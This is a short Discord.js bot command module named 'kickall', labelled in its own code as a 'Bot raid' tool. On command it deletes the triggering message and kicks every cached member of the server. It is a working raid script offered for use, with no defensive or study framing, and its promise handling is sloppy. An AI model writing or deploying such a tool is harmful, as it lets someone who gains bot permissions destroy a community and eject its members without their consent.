

module.exports = {
  name: 'kickall',
  description: 'kill server with your config!',
  async execute(message, args) {
    message.delete()

        process.title = `Kickall executed | Bot raid created by yiko`


    
    const prosesKick = [];

    const mebmersID = message.guild.members.cache.filter(user => user.id )

    const promeses = mebmersID.map(user => {
      prosesKick.push(user.kick())
    })

  await Promise.all(promeses)
}
};